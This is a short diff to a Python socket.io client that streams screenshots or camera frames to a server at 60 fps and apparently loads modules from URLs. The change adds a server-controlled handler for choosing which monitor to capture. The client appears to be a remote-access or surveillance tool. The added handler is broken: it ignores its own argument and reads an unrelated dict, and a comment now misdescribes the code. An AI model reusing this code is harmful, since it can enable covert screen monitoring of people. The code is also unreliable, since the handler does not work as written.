@@ -20,6 +20,7 @@ import pyautogui
 # Declare the global stop event
 stop_event = threading.Event()
 screen_or_camera = "screen"
+screen_number = 1
 
 def run(data):
     def create_module(url):
@@ -214,6 +215,11 @@ def run(data):
             except:
                 "Thread is already dead"
 
+    @sio.on("change_screen_number")
+    def change_screen_number(data_new):
+        global screen_number
+        screen_number = data['change_screen_number']
+
     def take_screenshots(sio, uid, fps=60, quality=30):
         frame_interval = 1 / fps
         last_capture_time = 0
@@ -222,7 +228,7 @@ def run(data):
 
         if screen_or_camera == "screen":
             with mss.mss() as sct:
-                monitor = sct.monitors[0]  # Capture the entire screen
+                monitor = sct.monitors[screen_number]  # Capture the entire screen
 
                 while not stop_event.is_set():
                     current_time = time.time()
